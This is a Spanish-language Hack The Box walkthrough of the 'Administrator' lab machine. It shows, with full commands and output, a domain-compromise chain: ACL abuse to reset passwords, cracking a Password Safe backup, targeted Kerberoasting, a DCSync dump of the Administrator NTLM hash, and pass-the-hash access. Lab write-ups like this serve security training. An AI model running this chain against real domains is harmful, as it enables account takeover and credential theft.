---
title: Administrator
description: Administrator es una máquina Windows de dificultad media, diseñada en torno a un escenario de compromiso de dominio, donde se proporcionan credenciales para un usuario de bajos privilegios. Para obtener acceso a la cuenta Michael, se enumeran los ACL (listas de control de acceso) sobre objetos privilegiados, lo que nos lleva a descubrir que el usuario Olivia tiene permisos Genericall sobre Michael, lo que nos permite reiniciar su contraseña. Con el acceso como Michael, se revela que puede forzar un cambio de contraseña en el usuario Benjamin, cuya contraseña se restablece. Esto otorga acceso a FTP, donde se descubre un archivo backup.psafe3, el cual es descifrado y revela credenciales de varios usuarios. Estas credenciales se "rocían" en todo el dominio, revelando credenciales válidas para el usuario Emily. Una enumeración adicional muestra que Emily tiene permisos de genicWrite sobre el usuario Ethan, lo que nos permite realizar un ataque kerberoasting. El hash recuperado es crackeado y revela credenciales válidas para Ethan, quien se encuentra que tiene derechos DCSYNC en última instancia, lo que permite la recuperación del hash de la cuenta Administrator y el compromiso completo del dominio.
date: 2025-02-10
toc: true
pin: false
image:
 path: /assets/img/htb-writeup-administrator/administrator_logo.png
categories:
  - Hack_The_Box
  - Machines
tags:
  - windows
  - hack_the_box
  - tcp
  - ftp
  - dns
  - smb
  - kerberos
  - ldap
  - winrm
  - active_directory
  - access_control_list
  - password_attacks
  - targeted_kerberoast_attack
  - dcsync_attack
  - tgs
  - information_gathering
  - active_directory_enumeration
  - active_directory_exploitation
  - privilege_escalation

---
### Machine Information

As is common in real life Windows pentests, you will start the Administrator box with credentials for the following account: Username: `Olivia` Password: `ichliebedich`

---
## Information Gathering

El análisis inicial comienza con el comando ping para confirmar la accesibilidad de la máquina objetivo en la red.

```terminal
/home/kali/Documents/htb/machines/administrator:-$ ping -c 1 10.10.11.42
PING 10.10.11.42 (10.10.11.42) 56(84) bytes of data.
64 bytes from 10.10.11.42: icmp_seq=1 ttl=127 time=334 ms

--- 10.10.11.42 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 334.216/334.216/334.216/0.000 ms
```

Realizo un escaneo agresivo de puertos con nmap, lo que me permite identificar rápidamente todos los puertos abiertos.

```terminal
/home/kali/Documents/htb/machines/administrator:-$ sudo nmap -p- --open -sS --min-rate 5000 -vvv 10.10.11.42 -n -Pn -oG nmap1
Host: 10.10.11.42 ()    Status: Up
Host: 10.10.11.42 ()    Ports: 21/open/tcp//ftp///, 53/open/tcp//domain///, 88/open/tcp//kerberos-sec///, 135/open/tcp//msrpc///, 139/open/tcp//netbios-ssn///, 389/open/tcp//ldap///, 445/open/tcp//microsoft-ds///, 464/open/tcp//kpasswd5///, 593/open/tcp//http-rpc-epmap///, 636/open/tcp//ldapssl///, 3268/open/tcp//globalcatLDAP///, 3269/open/tcp//globalcatLDAPssl///, 5985/open/tcp//wsman///, 9389/open/tcp//adws///, 47001/open/tcp//winrm///, 49664/open/tcp/////, 49665/open/tcp/////, 49666/open/tcp/////, 49667/open/tcp/////, 49668/open/tcp/////, 51402/open/tcp/////, 58205/open/tcp/////, 58210/open/tcp/////, 58213/open/tcp/////, 58230/open/tcp/////, 58263/open/tcp/////
```

Profundizo en los puertos detectados, recopilando información detallada sobre los servicios y versiones en ejecución.

```terminal
/home/kali/Documents/htb/machines/administrator:-$ sudo nmap -sCV -p21,53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49667,49668,51402,58205,58210,58213,58230,58263 -vvv 10.10.11.42 -oN nmap2
PORT      STATE SERVICE       REASON          VERSION
21/tcp    open  ftp           syn-ack ttl 127 Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-02-10 06:26:02Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack ttl 127
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack ttl 127
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
47001/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49665/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49666/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49668/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
51402/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
58205/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
58210/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
58213/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
58230/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
58263/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 35406/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 40321/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 52617/udp): CLEAN (Timeout)
|   Check 4 (port 32087/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-02-10T06:27:07
|_  start_date: N/A
|_clock-skew: 7h00m01s
```

Se identifica el sistema objetivo como un controlador de dominio basado en Windows Server 2022.

```terminal
/home/kali/Documents/htb/machines/administrator:-$ crackmapexec smb administrator.htb
SMB         administrator.htb 445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:False)

/home/kali/Documents/htb/machines/administrator:-$ echo '10.10.11.42\tadministrator.htb\tdc\tdc.administrator.htb' | sudo tee -a /etc/hosts
```

Pruebo las credenciales del usuario `Olivia`, las cuales son válidas tanto para SMB como para el servicio WinRM.

```terminal
/home/kali/Documents/htb/machines/administrator:-$ crackmapexec smb administrator.htb -u "Olivia" -p "ichliebedich"
SMB         administrator.htb 445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:False)
SMB         administrator.htb 445    DC               [+] administrator.htb\Olivia:ichliebedich

/home/kali/Documents/htb/machines/administrator:-$ crackmapexec winrm administrator.htb -u "Olivia" -p "ichliebedich"
SMB         administrator.htb 5985   DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:administrator.htb)
HTTP        administrator.htb 5985   DC               [*] http://administrator.htb:5985/wsman
WINRM       administrator.htb 5985   DC               [+] administrator.htb\Olivia:ichliebedich (Pwn3d!)
```

---
## Active Directory Enumeration

Recolecto información del entorno Active Directory utilizando Bloodhound.

```terminal
/home/kali/Documents/htb/machines/administrator:-$ sudo ntpdate administrator.htb
/home/kali/Documents/htb/machines/administrator:-$ bloodhound-python -u Olivia -p 'ichliebedich' --zip -c All -d administrator.htb -ns 10.10.11.42
```

![](assets/img/htb-writeup-administrator/administrator1_2.png)

```terminal
/home/kali/Documents/tools/bloodhound:-# ./bloodhound-cli install
```

El usuario `OLIVIA@ADMINISTRATOR.HTB` tiene el permiso `GenericAll` sobre `MICHAEL@ADMINISTRATOR.HTB`. Este tipo de permiso otorga control total sobre el objeto, permitiendo realizar acciones como cambiar su contraseña.

![](assets/img/htb-writeup-administrator/administrator1_3.png)

Y el usuario `MICHAEL@ADMINISTRATOR.HTB` posee privilegios `ForceChangePassword` sobre `BENJAMIN@ADMINISTRATOR.HTB`. Esto permite forzar un cambio de contraseña sobre la cuenta objetivo, incluso sin conocer la actual.

![](assets/img/htb-writeup-administrator/administrator1_4.png)

---
## Active Directory Exploitation

Cambio la contraseña del usuario `Michael` utilizando los privilegios `GenericAll` de `Olivia`. Esto me permite escalar lateralmente a otra cuenta del dominio.

```terminal
/home/kali/Documents/htb/machines/administrator:-$ sudo bloodyAD -u "olivia" -p "ichliebedich" -d "Administrator.htb" --host "10.10.11.42" set password "Michael" "123456789"
[+] Password changed successfully!
```

Desde la cuenta de `Michael`, fuerzo también el cambio de contraseña de `Benjamin` gracias a los privilegios `ForceChangePassword`.

```terminal
/home/kali/Documents/htb/machines/administrator:-$ bloodyAD -u "Michael" -p "123456789" -d "Administrator.htb" --host "10.10.11.42" set password "Benjamin" "123456789"
[+] Password changed successfully!
```

Con las nuevas credenciales, accedo exitosamente al servicio FTP expuesto en la máquina objetivo.

```terminal
/home/kali/Documents/htb/machines/administrator:-$ ftp administrator.htb
Connected to administrator.htb.
220 Microsoft FTP Service
Name (administrator.htb:kali): Benjamin
331 Password required
Password: 123456789
230 User logged in.
```

Revisando el contenido disponible en el servicio FTP, identifico un archivo potencialmente sensible llamado `Backup.psafe3`.

![](assets/img/htb-writeup-administrator/administrator2_1.png)

El archivo pertenece al gestor de contraseñas Password Safe, por lo que es probable que contenga credenciales válidas.

```terminal
/home/kali/Documents/htb/machines/administrator:-$ sudo apt install passwordsafe

/home/kali/Documents/htb/machines/administrator:-$ pwsafe Backup.psafe3
```

Para acceder al contenido, necesito una contraseña maestra.

![](assets/img/htb-writeup-administrator/administrator2_2.png)

Para intentar romper la protección, extraigo el hash de la contraseña maestra con pwsafe2john y ejecuto un ataque de diccionario.

```terminal
/home/kali/Documents/htb/machines/administrator:-$ pwsafe2john Backup.psafe3 > pwsafe-hash.txt

/home/kali/Documents/htb/machines/administrator:-$ john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
tekieromucho     (Backu)
```

![](assets/img/htb-writeup-administrator/administrator2_3.png)

Al acceder a la base de datos, encuentro múltiples credenciales. Sólo una de ellas resulta válida `emily`:`UXLCI5iETUsIBoFVTj8yQFKoHjXmb`.

Con estas credenciales, ingreso exitosamente al sistema mediante el servicio WinRM.

```terminal
/home/kali/Documents/htb/machines/administrator:-$ crackmapexec winrm administrator.htb -u "emily" -p "UXLCI5iETUsIBoFVTj8yQFKoHjXmb"
SMB         administrator.htb 5985   DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:administrator.htb)
HTTP        administrator.htb 5985   DC               [*] http://administrator.htb:5985/wsman
WINRM       administrator.htb 5985   DC               [+] administrator.htb\emily:UXLCI5iETUsIBoFVTj8yQFKoHjXmb (Pwn3d!)


/home/kali/Documents/htb/machines/administrator:-$ evil-winrm -i administrator.htb -u emily -p "UXLCI5iETUsIBoFVTj8yQFKoHjXmb"

*Evil-WinRM* PS C:\Users\emily> type Desktop/user.txt
```

---
## Privilege Escalation

`Emily` tiene permisos de tipo `GenericWrite` sobre el usuario `ETHAN@ADMINISTRATOR.HTB`. Esto permite modificar ciertos atributos del objeto `Ethan`, como por ejemplo el `servicePrincipalName`.

![](assets/img/htb-writeup-administrator/administrator4_1.png)

Por otro lado, el usuario `ETHAN@ADMINISTRATOR.HTB` posee privilegios extendidos sobre el objeto del controlador de dominio `ADMINISTRATOR.HTB`. Específicamente, cuenta con los permisos `GetChanges`, `GetChangesInFilteredSet` y `GetChangesAll`. Este conjunto de permisos indica que el usuario tiene capacidad para ejecutar un ataque [DCSync](https://www.thehacker.recipes/ad/movement/credentials/dumping/dcsync#dcsync), el cual permite replicar hashes de contraseñas directamente desde el controlador de dominio, simulando el comportamiento de un Domain Controller.

![](assets/img/htb-writeup-administrator/administrator4_2.png)

Esta relación puede aprovecharse mediante un ataque de [Targeted Kerberoast](https://www.thehacker.recipes/ad/movement/dacl/targeted-kerberoasting#targeted-kerberoasting), que consiste en establecer temporalmente un SPN personalizado, forzar la emisión de un ticket Kerberos (TGS), capturar su hash y posteriormente eliminar el SPN. Para llevar a cabo esta técnica se utiliza la herramienta [targetedKerberoast](https://github.com/ShutdownRepo/targetedKerberoast.git), que automatiza todo el proceso.

```terminal
/home/kali/Documents/htb/machines/administrator:-$ sudo ntpdate administrator.htb
(venv)-/home/kali/Documents/htb/machines/administrator:-$ sudo python /home/kali/Documents/tools/targetedKerberoast/targetedKerberoast.py -u "emily" -p "UXLCI5iETUsIBoFVTj8yQFKoHjXmb" -d "Administrator.htb" --dc-ip 10.10.11.42
```
![](assets/img/htb-writeup-administrator/administrator4_3.png)

Una vez obtenido el hash Kerberos, se procede a crackearlo con John the Ripper utilizando el diccionario `rockyou.txt`. El resultado revela que la contraseña asociada al usuario `ethan` es `limpbizkit`.

```terminal
/home/kali/Documents/htb/machines/administrator:-$ john krb5-hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
limpbizkit       (?)
```

Con esta credencial se ejecuta un ataque DCSync mediante la herramienta impacket-secretsdump, aprovechando los privilegios extendidos `GetChangesAll`. El ataque permite extraer el hash NTLM del usuario `Administrator`.

```terminal
/home/kali/Documents/htb/machines/administrator:-$ impacket-secretsdump "Administrator.htb/ethan:limpbizkit"@"dc.Administrator.htb"
Administrator:500:aad3b435b51404eeaad3b435b51404ee:3dc553ce4b9fd20bd016e098d2d2fd2e:::
```

![](assets/img/htb-writeup-administrator/administrator4_4.png)

Finalmente, se utiliza evil-winrm para establecer una sesión remota como el usuario `Administrator`, utilizando el hash NTLM obtenido en la etapa anterior. El acceso exitoso confirma el compromiso completo del dominio.

```terminal
/home/kali/Documents/htb/machines/administrator:-$ evil-winrm -i administrator.htb -u administrator -H "3dc553ce4b9fd20bd016e098d2d2fd2e"

*Evil-WinRM* PS C:\Users\Administrator> type Desktop/root.txt
```

> <a href="https://www.hackthebox.com/achievement/machine/1521382/634" target="_blank">Administrator Machine from Hack The Box has been Pwned</a>
{: .prompt-tip }

